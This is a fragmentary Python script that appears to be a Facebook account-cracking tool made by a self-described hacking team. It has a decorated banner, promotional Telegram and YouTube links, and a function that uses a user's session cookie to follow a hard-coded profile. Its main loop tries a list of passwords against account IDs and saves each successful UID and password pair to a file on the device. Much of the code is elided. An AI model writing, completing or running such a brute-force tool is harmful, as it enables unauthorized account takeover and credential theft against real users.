#created by ZUYEL 
#team name Kali huntar
#tottaly written by ZuyelHuntar
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; ZUYEL  \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER    \033[1;31m    ➟   \033[1;32m꧁𓊈𒆜 ZUYEL  𒆜𓊉꧂      \033[1;31m      ‌‌‌‌‌‌‌
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m       প্যরা নাঁই     \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m     Lenax huntar   \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m   ➟   \033[1;32m    like -a-brow    \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION  \033[1;31m    ➟   \033[1;32m1.2   \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32m𝙏EAM KALi HUNTAR \033[1;37m {\033[1;36mTBH\033[1;37m}   \033[1;31m          
\033[1;37m╚\033[1;36mⓉⒷⒽ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐓𝐄𝐀𝐌𓆪 𓆩𓆪  𓆩 ZUYEL HUNTAR𓆪 ]\x1b[0m══════\033[1;36mⓉⒷⒽ 
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001090801712', cookies={'cookie': coki}).text, 'html.parser')
...
def XYZ():
    ...
    if WASIM in ["1","01"]:
        ...
        os.system("xdg-open https://t.me/+6sE_mwb9T2MxZTE1")
        XYZ()
    elif WASIM in ["3","03"]:
        os.system("xdg-open https://www.youtube.com/@Like_a_Boss2 ")
        XYZ()
    elif WASIM in ["0","00"]:
       exit()
    else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/ZUYEL -OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Zuyel 🔥] [%s] \33[1;97m[OK:%s{WASIM2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
